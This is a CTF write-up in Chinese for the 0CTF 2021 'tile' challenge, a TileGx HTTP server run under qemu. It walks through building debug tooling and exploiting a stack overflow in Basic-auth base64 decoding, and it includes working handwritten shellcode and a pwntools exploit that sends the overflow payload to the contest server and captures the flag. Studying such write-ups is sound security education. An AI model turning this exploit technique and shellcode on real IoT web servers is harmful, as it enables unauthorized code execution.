---
title: 0ctf 2021 tile
categories:
- CTF/Pwn
tags: 
---

> 更新中...

Tilegx指令集的linux用户态程序，除了qemu可以运行这个程序以外，没有任何的辅助工具，全部要自己找到或者搞定，运行的功能是通过标准输入输出运行的httpsevrer。

首先编译了这个架构的gdb客户端，然后qemu没有实现这个架构的gdb桩，照着其他架构糊了一个类似能读写内存和寄存器的调试，断点功能没有实现，不过可以通过直接对目标代码插入非法指令或者内存错误的指令完成断点附近的状态查看。

然后就是希望找到这个东西的交叉编译工具链，没有找到可用的，但是发现centos上提供了这个包，所以直接yum就有了这个东西的gcc以及objdump objcopy啥的，于是可以反编译以及编译shellcode了。老外开发了这个架构的ida插件，不过仅仅适配了linux的ida，并没有资源，所以直接放弃逆向，直奔调试。

这个httpserver存在basic认证，iot的basic认证经常出现栈溢出，因为在base64解码时，经常调用的解码函数并没有对输出位置的长度进行限制，导致出现缓冲区溢出，瞎发包果然测出来可以控制流劫持，并不知道怎么绕过的canary。

qemu-user是docker里ubuntu 20.04 直接install的，没有patch，故原生的qemu不支持NX，故shellcode一把梭应该就行，在堆上找到了base64解码后的数据，故shellcode不必考虑00，堆地址在同一个环境下是固定的，给了docker，换掉其中的qemu为刚才编译的可以调试的qemu，直接开调即可。

dockerfile里限制了ctf用户不可执行/bin/sh，所以shellcode的功能是`execve("/readflag",["/readflag","/flag",0],0)`，shellcode可以把libc用objdump反编译，然后照着execve抄，看看语法和寄存器啥的，系统调用号和正常linux64位一样，然后写shellcode即可

- [从ChimayRed漏洞看不同架构下的栈溢出利用实践](https://mp.weixin.qq.com/s/q1zHgQ864u4t9QlzSIzoZw)
- [tile.gz](https://xuanxuanblingbling.github.io/assets/attachment/tile/tile.gz)
## 工具

### 模拟运行：qemu

```
FROM ubuntu:20.04

ARG DEBIAN_FRONTEND=noninteractive
ENV TZ=Asia/Shanghai

RUN sed -i "s/http:\/\/archive.ubuntu.com/http:\/\/ftp.sjtu.edu.cn/g" /etc/apt/sources.list && \
    apt-get update && apt-get -y dist-upgrade && \
    apt-get install -y xinetd qemu-user
```

> ctf.xinetd

```
service ctf
{
    disable = no
    socket_type = stream
    protocol    = tcp
    wait        = no
    user        = ctf
    type        = UNLISTED
    port        = 9999
    bind        = 0.0.0.0
    server      = /usr/bin/qemu-tilegx
    # replace helloworld to your program
    server_args = -L /home/ctf/ /home/ctf/httpd /home/ctf/html
    banner_fail = /etc/banner_fail
    # safety options
    per_source	= 10 # the maximum instances of this service per source IP address
    rlimit_cpu	= 20 # the maximum number of CPU seconds that the service may use
    #rlimit_as  = 1024M # the Address Space resource limit for the service
    #access_times = 2:00-9:00 12:00-24:00
}

```


### 逆向工具：ida

- [https://blog.talosintelligence.com/2019/10/new-ida-pro-plugin-provides-tilegx.html](https://blog.talosintelligence.com/2019/10/new-ida-pro-plugin-provides-tilegx.html)

### 编译工具链：gcc

本地编译未果，发现centos上有编译好的包，腾讯云换个centos的镜像，然后直接yum安装即可：

```python
[root@VM-8-11-centos ~]$ cat /etc/redhat-release
CentOS Linux release 7.9.2009 (Core)

[root@VM-8-11-centos ~]$ yum update
CentOS Linux release 7.9.2009 (Core)

[root@VM-8-11-centos ~]$ yum search tile gcc
Loaded plugins: fastestmirror, langpacks
Loading mirror speeds from cached hostfile
================================================================================================================================== N/S matched: tile, gcc ==================================================================================================================================
gcc-c++-tile-linux-gnu.x86_64 : Cross-build binary utilities for tile-linux-gnu
gcc-tile-linux-gnu.x86_64 : Cross-build binary utilities for tile-linux-gnu

[root@VM-8-11-centos ~]$ yum install gcc-tile-linux-gnu.x86_64

[root@VM-8-11-centos ~]$ tile-linux-gnu-
tile-linux-gnu-addr2line  tile-linux-gnu-cpp        tile-linux-gnu-gprof      tile-linux-gnu-objcopy    tile-linux-gnu-size
tile-linux-gnu-ar         tile-linux-gnu-elfedit    tile-linux-gnu-ld         tile-linux-gnu-objdump    tile-linux-gnu-strings
tile-linux-gnu-as         tile-linux-gnu-gcc        tile-linux-gnu-ld.bfd     tile-linux-gnu-ranlib     tile-linux-gnu-strip
tile-linux-gnu-c++filt    tile-linux-gnu-gcov       tile-linux-gnu-nm         tile-linux-gnu-readelf    
```

### 调试客户端：gdb

```
➜  sudo apt-get install texinfo
```

```
➜  wget http://ftp.gnu.org/gnu/gdb/gdb-10.2.tar.gz
➜  tar -xvzf ./gdb-10.2.tar.gz
➜  cd gdb-10.2/
➜  mkdir build
➜  cd build
➜  ../configure --target=tilegx-linux --prefix=/home/xuanxuan/Desktop/tilegdb
➜  make -j 4 && make install
```

```
➜  pwd
/home/xuanxuan/Desktop/tilegdb/bin
➜  ls
tilegx-linux-gdb  tilegx-linux-gdb-add-index
➜  ./tilegx-linux-gdb -q
(gdb) set architecture 
auto      tilegx    tilegx32  
(gdb) set architecture tilegx
The target architecture is set to "tilegx".
(gdb) set endian little 
The target is set to little endian.
(gdb) 
```

### 调试服务端：qemu

> https://wiki.qemu.org/Hosts/Linux

```
mkdir build
cd build
../configure --target-list=tilegx-linux-user
make
```

```patch
diff -uprN ./qemu-5.2.0/linux-user/tilegx/cpu_loop.c ./qemu-5.2.0_patch/linux-user/tilegx/cpu_loop.c
--- ./qemu-5.2.0/linux-user/tilegx/cpu_loop.c	2020-12-09 00:59:44.000000000 +0800
+++ ./qemu-5.2.0_patch/linux-user/tilegx/cpu_loop.c	2021-07-05 13:26:52.000000000 +0800
@@ -266,6 +266,10 @@ void cpu_loop(CPUTLGState *env)
         case EXCP_ATOMIC:
             cpu_exec_step_atomic(cs);
             break;
+        case EXCP_INTERRUPT:
+            printf("[+] interrupt\n");
+            /* just indicate that signals should be handled asap */
+            break;
         default:
             fprintf(stderr, "trapnr is %d[0x%x].\n", trapnr, trapnr);
             g_assert_not_reached();
diff -uprN ./qemu-5.2.0/target/tilegx/cpu.c ./qemu-5.2.0_patch/target/tilegx/cpu.c
--- ./qemu-5.2.0/target/tilegx/cpu.c	2021-07-05 13:24:56.000000000 +0800
+++ ./qemu-5.2.0_patch/target/tilegx/cpu.c	2021-07-05 13:28:48.000000000 +0800
@@ -136,6 +136,7 @@ static bool tilegx_cpu_exec_interrupt(CP
 
 static void tilegx_cpu_class_init(ObjectClass *oc, void *data)
 {
+    printf("[+]hello xuanxuan\n");
     DeviceClass *dc = DEVICE_CLASS(oc);
     CPUClass *cc = CPU_CLASS(oc);
     TileGXCPUClass *tcc = TILEGX_CPU_CLASS(oc);
@@ -152,7 +153,9 @@ static void tilegx_cpu_class_init(Object
     cc->dump_state = tilegx_cpu_dump_state;
     cc->set_pc = tilegx_cpu_set_pc;
     cc->tlb_fill = tilegx_cpu_tlb_fill;
-    cc->gdb_num_core_regs = 0;
+    cc->gdb_read_register = tilegx_cpu_gdb_read_register;
+    cc->gdb_write_register = tilegx_cpu_gdb_write_register;
+    cc->gdb_num_core_regs = 66;
     cc->tcg_initialize = tilegx_tcg_init;
 }
 
diff -uprN ./qemu-5.2.0/target/tilegx/cpu.h ./qemu-5.2.0_patch/target/tilegx/cpu.h
--- ./qemu-5.2.0/target/tilegx/cpu.h	2020-12-09 00:59:44.000000000 +0800
+++ ./qemu-5.2.0_patch/target/tilegx/cpu.h	2021-07-05 13:23:24.000000000 +0800
@@ -144,6 +144,8 @@ typedef TileGXCPU ArchCPU;
 
 void tilegx_tcg_init(void);
 int cpu_tilegx_signal_handler(int host_signum, void *pinfo, void *puc);
+int tilegx_cpu_gdb_read_register(CPUState *cpu, GByteArray *buf, int reg);
+int tilegx_cpu_gdb_write_register(CPUState *cpu, GByteArray *buf, int reg);
 
 #define CPU_RESOLVING_TYPE TYPE_TILEGX_CPU
 
diff -uprN ./qemu-5.2.0/target/tilegx/gdbstub.c ./qemu-5.2.0_patch/target/tilegx/gdbstub.c
--- ./qemu-5.2.0/target/tilegx/gdbstub.c	1970-01-01 08:00:00.000000000 +0800
+++ ./qemu-5.2.0_patch/target/tilegx/gdbstub.c	2021-07-04 03:40:31.000000000 +0800
@@ -0,0 +1,44 @@
+#include "qemu/osdep.h"
+#include "cpu.h"
+#include "exec/gdbstub.h"
+
+int tilegx_cpu_gdb_read_register(CPUState *cs, GByteArray *mem_buf, int n)
+{
+    TileGXCPU *cpu = TILEGX_CPU(cs);
+    CPUTLGState *env = &cpu->env;
+
+    switch (n) {
+    case 0 ... 55:
+        return gdb_get_regl(mem_buf, env->regs[n]);
+    case 56 ... 63:
+        return gdb_get_regl(mem_buf, 0);
+    case 64:
+        return gdb_get_regl(mem_buf, env->pc);
+    case 65:
+        return gdb_get_regl(mem_buf, 0);
+    }
+    return 0;
+}
+
+int tilegx_cpu_gdb_write_register(CPUState *cs, GByteArray *mem_buf, int n)
+{
+    TileGXCPU *cpu = TILEGX_CPU(cs);
+    CPUTLGState *env = &cpu->env;
+    uint64_t tmp;
+
+    tmp = ldq_p(mem_buf);
+
+    switch (n) {
+    case 0 ... 55:
+        env->regs[n] = tmp;
+        return 8;
+    case 56 ... 63:
+        return 8;
+    case 64:
+        env->pc = tmp;
+        return 8;
+    case 65:
+        return 8;
+    }
+    return 0;
+}
\ No newline at end of file
diff -uprN ./qemu-5.2.0/target/tilegx/meson.build ./qemu-5.2.0_patch/target/tilegx/meson.build
--- ./qemu-5.2.0/target/tilegx/meson.build	2020-12-09 00:59:44.000000000 +0800
+++ ./qemu-5.2.0_patch/target/tilegx/meson.build	2021-07-04 02:38:02.000000000 +0800
@@ -3,6 +3,7 @@ tilegx_ss.add(files(
   'cpu.c',
   'helper.c',
   'simd_helper.c',
+  'gdbstub.c',
   'translate.c',
 ))
 tilegx_ss.add(zlib)
```

## 调试

### docker

需要把编译好的支持gdb的qemu扔到docker里去调试，这里我放到了`binary/qemu-tilegx-xuan`，然后按照如下方法修改dockerfile：

```patch

diff -uprN ./docker/Dockerfile ./docker_patch/Dockerfile
--- ./docker/Dockerfile	2021-07-03 11:51:23.000000000 +0800
+++ ./docker_patch/Dockerfile	2021-07-16 23:54:47.000000000 +0800
@@ -24,9 +24,9 @@ RUN chmod u+s /readflag && \
 
 COPY ./binary/ /home/ctf/
 RUN chown -R root:ctf /home/ctf && \
-    chmod -R 750 /home/ctf
+    chmod -R 750 /home/ctf && \
+    chmod +X /home/ctf/qemu-tilegx-xuan
 
-RUN chmod 750 /bin/sh
 
 RUN apt-get -y autoremove
 RUN apt-get clean && \
@@ -36,4 +36,5 @@ RUN apt-get clean && \
 
 CMD ["/start.sh"]
 
+EXPOSE 1234
 EXPOSE 9999
Binary files ./docker/binary/qemu-tilegx-xuan and ./docker_patch/binary/qemu-tilegx-xuan differ
diff -uprN ./docker/ctf.xinetd ./docker_patch/ctf.xinetd
--- ./docker/ctf.xinetd	2021-07-03 11:50:39.000000000 +0800
+++ ./docker_patch/ctf.xinetd	2021-07-04 15:02:41.000000000 +0800
@@ -8,9 +8,9 @@ service ctf
     type        = UNLISTED
     port        = 9999
     bind        = 0.0.0.0
-    server      = /usr/bin/qemu-tilegx
+    server      = /home/ctf/qemu-tilegx-xuan
     # replace helloworld to your program
-    server_args = -L /home/ctf/ /home/ctf/httpd /home/ctf/html
+    server_args = -g 1234 -L /home/ctf/ /home/ctf/httpd /home/ctf/html
     banner_fail = /etc/banner_fail
     # safety options
     per_source	= 10 # the maximum instances of this service per source IP address
```

在分析原来的dockerfile时有发现有一个非常坑的点（其实是在后面exp打不通的时候发现的：

``c
RUN chmod 750 /bin/sh
```

docker搭起来后，发现的确CTF用户没有权限执行/bin/sh，flag文件也是普通用户无法读取的:


```c
root@6360a0d57b09:/# su ctf
su: failed to execute /bin/sh: Permission denied
root@6360a0d57b09:/# ls -al /flag
-r-------- 1 root root 16 Jul  3 11:50 /flag
```

所以只能去执行根目录下的/readflag：

```c
root@6360a0d57b09:/# /readflag
[usage] /readflag file
root@6360a0d57b09:/# /readflag /flag
flag{fake_flag}
```

所以我们最终的shellcode是：`execve("/readflag",["/readflag","/flag",0])`

### gdb


### fuzz

## 利用

### 学习汇编

```c
$ tilegx-linux-objdump -d ./lib/libc.so.6 > libc.asm
$ tilegx-linux-objdump -d ./httpd > httpd.asm
```

> httpd.asm

```
 10016a8:	180fffe051483000 	{ movei r0, -1 }
 10016b0:	200004d3d1483000 	{ jal 10063e8 <exit@plt> }
```

> libc.asm

```c

00000000000eeb68 <_exit>:
   eeb68:	2863bec010000fc1 	{ moveli r1, 0 ; st sp, lr }
   eeb70:	283bf81bc01c0db6 	{ addi sp, sp, -64 ; move lr, r0 }
   eeb78:	180986ce40138d9d 	{ addi r29, sp, 56 ; addi r28, sp, 48 }
   eeb80:	c79906cd05d28d9b 	{ addi r27, sp, 40 ; addi r26, sp, 32 ; st r29, r51 }
   eeb88:	c797038e05ce075d 	{ addi r29, r29, -32 ; addi r28, r28, -32 ; st r28, r50 }
   eeb90:	2863136010013ff3 	{ moveli r51, 19 ; st r27, r34 }
   eeb98:	df0e400005ae06db 	{ addi r27, r27, -32 ; st r26, r33 }
   eeba0:	286303a0711a8cf3 	{ shl16insli r51, r51, 4520 ; st r29, r32 }
   eeba8:	2862fb8070258040 	{ shl16insli r0, r1, 600 ; st r28, r31 }
   eebb0:	def6701905b5efdf 	{ movei r31, 94 ; lnk r50 ; st r27, r30 }
   eebb8:	180aefef500f2cf3 	{ add r51, r51, r50 ; movei r30, 93 }
   eebc0:	283bfbe5500c0cc0 	{ add r0, r51, r0 ; move r10, r31 }
   eebc8:	286ae80051483000 	{ ld r0, r0 }
   eebd0:	283bfee0500c0d60 	{ add r32, tp, r0 ; move r0, lr }
   eebd8:	286b180051485000 	{ swint1 } 

00000000000eec48 <execve>:
   eec48:	0006efe5401f0db6 	{ addi sp, sp, -16 ; moveli r10, 221 }
   eec50:	180846ced1483000 	{ addi r29, sp, 8 }
   eec58:	28639ba010013ff3 	{ moveli r51, 19 ; st r29, r51 }
   eec60:	286396c0710f0cf3 	{ shl16insli r51, r51, 4336 ; st sp, r50 }
   eec68:	286af01951483000 	{ lnk r50 }
   eec70:	28079679d1483000 	{ add r51, r51, r50 }
   eec78:	286b180051485000 	{ swint1 }
   eec80:	181000005107f043 	{ move r3, r1 ; addxi r0, r0, 0 }
   eec88:	17c00061d1483000 	{ bnez r3, eeca0 <execve+0x58> }
   eec90:	9f96400007608d9d 	{ addi r29, sp, 8 ; ld r50, sp }
   eec98:	9f9e66e005d10db6 	{ addi sp, sp, 16 ; jrp lr ; ld r51, r29 }
   eeca0:	180fffe010000fc1 	{ moveli r1, 0 ; movei r0, -1 }
   eeca8:	3812c020d1483000 	{ shl16insli r1, r1, 600 }
   eecb0:	28060e60d1483000 	{ add r1, r51, r1 }
   eecb8:	286ae820d1483000 	{ ld r1, r1 }
   eecc0:	28060ea0d1483000 	{ add r1, tp, r1 }
   eecc8:	de1e4000301c3000 	{ st4 r1, r3 }
   eecd0:	27fffffc51483000 	{ j eec90 <execve+0x48> }
```

基本能分析出：

- 函数调用以及系统调用传递参数的寄存器是：r0,r1,r2
- 系统调用号使用r10寄存器进行传递
- st和ld应该分别是存数和取数操作
- movei可以讲立即数赋值给寄存器
- swint1是系统调用指令

学到这基本就能写shellcode了，如果还想更细致的了解可以寻找指令手册，比较难找，也不太清晰：

- [tile-gx instruction set architecture](https://studylib.net/doc/18755547/tile-gx-instruction-set-architecture)

还可以找gdb、qemu等代码：

> qemu-5.2.0/target/tilegx/opcode_tilegx.h  
> qemu-5.2.0/target/tilegx/translate.c

不过这些都不太清晰，最清晰的是那个linux的ida插件，看起来基本就是速查表：

- [https://github.com/Cisco-Talos/ida_tilegx/blob/master/ins.cpp](https://github.com/Cisco-Talos/ida_tilegx/blob/master/ins.cpp)

```c
{"st",                 CF_USE1 | CF_USE2},           //Store
{"st1",                CF_USE1 | CF_USE2},           //Store byte
{"st1_add",            CF_USE1 | CF_USE2 | CF_USE3}, //Store byte and add
{"st2",                CF_USE1 | CF_USE2},           //Store two bytes
{"st2_add",            CF_USE1 | CF_USE2 | CF_USE3}, //Store two bytes and add
{"st4",                CF_USE1 | CF_USE2},           //Store four bytes
```

### shellcode

#### 比赛shellcode

> 比赛是写的shellcode比较垃圾

```s
 .global _start
    .text
_start:
        movei r1,0
        movei r2,0

        movei r3,0x2f
        addi sp, sp, -16
        st1 sp,r

        movei r3,0x72
        addi sp,sp,1
        st1 sp,r3

        movei r3,0x65
        addi sp,sp,1
        st1 sp,r3

        movei r3,0x61
        addi sp,sp,1
        st1 sp,r3
        
        movei r3,0x64
        addi sp,sp,1
        st1 sp,r3
        
        movei r3,0x66
        addi sp,sp,1
        st1 sp,r3

        movei r3,0x6c
        addi sp,sp,1
        st1 sp,r3

        movei r3,0x61
        addi sp,sp,1
        st1 sp,r3

        movei r3,0x67
        addi sp,sp,1
        st1 sp,r3

        movei r3,0x00
        addi sp,sp,1
        st1 sp,r3

        addi sp,sp,-9
        addi r0, sp, 0

        moveli r10,221

        addi sp, sp, -32
        addi r1, sp, 0

        st sp,r0
        addi sp, sp, 8
        addi r7, sp, 16
        st sp,r7

        addi sp, sp, 8
        st sp,r2
        
        addi sp, sp, 8
        movei r3,0x2f
        st1 sp,r3
        addi sp,sp,1

        movei r3,0x66
        st1 sp,r3
        addi sp,sp,1

        movei r3,0x6c
        st1 sp,r3
        addi sp,sp,1

        movei r3,0x61
        st1 sp,r3
        addi sp,sp,1

        movei r3,0x67
        st1 sp,r3
        addi sp,sp,1

        movei r3,0x00
        st1 sp,r3
        addi sp,sp,1

#       ld r2,r2
        swint1
```

```python
[root@VM-8-11-centos ~]$ tile-linux-gnu-gcc shellcode.s -c 
[root@VM-8-11-centos ~]$ tile-linux-gnu-ld shellcode.o -o shellcode
[root@VM-8-11-centos ~]$ tile-linux-gnu-objcopy -O binary --only-section=.text shellcode  shellcode.text
```

### exp

```python
from pwn import *
import base64
context(log_level='debug')
shellcode  = b"\x00\x30\x48\xd1\xe0\x07\x08\x18\x00\x30\x48\x51\xe1\x07\x08\x18\x00\x30\x48\xd1\xe1\x7f\x09\x18\x00\x30\x48\x51\xdb\x86\x0f\x18"
shellcode += b"\x00\x30\x6c\x33\x00\x40\x1e\xdc\x00\x30\x48\xd1\xe1\x97\x0b\x18\x00\x30\x48\x51\xdb\x0e\x08\x18\x00\x30\x6c\x33\x00\x40\x1e\xdc"
shellcode += b"\x00\x30\x48\xd1\xe1\x2f\x0b\x18\x00\x30\x48\x51\xdb\x0e\x08\x18\x00\x30\x6c\x33\x00\x40\x1e\xdc\x00\x30\x48\xd1\xe1\x0f\x0b\x18"
shellcode += b"\x00\x30\x48\x51\xdb\x0e\x08\x18\x00\x30\x6c\x33\x00\x40\x1e\xdc\x00\x30\x48\xd1\xe1\x27\x0b\x18\x00\x30\x48\x51\xdb\x0e\x08\x18"
shellcode += b"\x00\x30\x6c\x33\x00\x40\x1e\xdc\x00\x30\x48\xd1\xe1\x37\x0b\x18\x00\x30\x48\x51\xdb\x0e\x08\x18\x00\x30\x6c\x33\x00\x40\x1e\xdc"
shellcode += b"\x00\x30\x48\xd1\xe1\x67\x0b\x18\x00\x30\x48\x51\xdb\x0e\x08\x18\x00\x30\x6c\x33\x00\x40\x1e\xdc\x00\x30\x48\xd1\xe1\x0f\x0b\x18"
shellcode += b"\x00\x30\x48\x51\xdb\x0e\x08\x18\x00\x30\x6c\x33\x00\x40\x1e\xdc\x00\x30\x48\xd1\xe1\x3f\x0b\x18\x00\x30\x48\x51\xdb\x0e\x08\x18"
shellcode += b"\x00\x30\x6c\x33\x00\x40\x1e\xdc\x00\x30\x48\xd1\xe1\x07\x08\x18\x00\x30\x48\x51\xdb\x0e\x08\x18\x00\x30\x6c\x33\x00\x40\x1e\xdc"
shellcode += b"\x00\x30\x48\x51\xdb\xbe\x0f\x18\x00\x30\x48\x51\xc0\x06\x08\x18\x00\x30\x48\x51\xe5\xef\x06\x00\x00\x30\x48\x51\xdb\x06\x0f\x18"
shellcode += b"\x00\x30\x48\xd1\xc0\x06\x08\x18\x00\x30\x6c\x37\x00\x40\x06\xde\x00\x30\x48\x51\xdb\x46\x08\x18\x00\x30\x48\xd1\xc3\x86\x08\x18"
shellcode += b"\x00\x30\x6c\x37\x00\x40\x3e\xde\x00\x30\x48\x51\xdb\x46\x08\x18\x00\x30\x6c\x37\x00\x40\x16\xde\x00\x30\x48\x51\xdb\x46\x08\x18"
shellcode += b"\x00\x30\x48\xd1\xe1\x7f\x09\x18\x00\x30\x6c\x33\x00\x40\x1e\xdc\x00\x30\x48\x51\xdb\x0e\x08\x18\x00\x30\x48\xd1\xe1\x37\x0b\x18"
shellcode += b"\x00\x30\x6c\x33\x00\x40\x1e\xdc\x00\x30\x48\x51\xdb\x0e\x08\x18\x00\x30\x48\xd1\xe1\x67\x0b\x18\x00\x30\x6c\x33\x00\x40\x1e\xdc"
shellcode += b"\x00\x30\x48\x51\xdb\x0e\x08\x18\x00\x30\x48\xd1\xe1\x0f\x0b\x18\x00\x30\x6c\x33\x00\x40\x1e\xdc\x00\x30\x48\x51\xdb\x0e\x08\x18"
shellcode += b"\x00\x30\x48\xd1\xe1\x3f\x0b\x18\x00\x30\x6c\x33\x00\x40\x1e\xdc\x00\x30\x48\x51\xdb\x0e\x08\x18\x00\x30\x48\xd1\xe1\x07\x08\x18"
shellcode += b"\x00\x30\x6c\x33\x00\x40\x1e\xdc\x00\x30\x48\x51\xdb\x0e\x08\x18\x00\x50\x48\x51\x00\x18\x6b\x28"

payload = b'admin:a0p_s3cr37_!@#'*7+b'admin:70p_s3cr37_!@#'+b'123'+p64(0x10211e8)+b'\x00xuanxua\x00yuanyuaaaaaa'+b'a'*8+shellcode
payload = base64.b64encode(payload)

http =  b"GET / HTTP/1.1\n"
http += b"Host: 111.186.59.27:28088\n"
http += b"Cache-Control: max-age=0\n"
http += b"Authorization: Basic "+payload+b'\n';
http += b"Upgrade-Insecure-Requests: 1\n"
http += b"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36\n"
http += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n"
http += b"Accept-Encoding: gzip, deflate\n"
http += b"Accept-Language: zh-CN,zh;q=0.9\n"
http += b"Connection: close\n\n"
io = remote("111.186.59.27",28088)
io.send(http)
io.interactive()
```

```python
➜  python3 exp.py
[+] Opening connection to 111.186.59.27 on port 28088: Done
[*] Switching to interactive mode
flag{rop_on_t1111111le-gx_is_funny_27b7d3}

[*] Got EOF while reading in interactive
```

## 总结

重要性：运行 > 调试 > 编译 > 逆向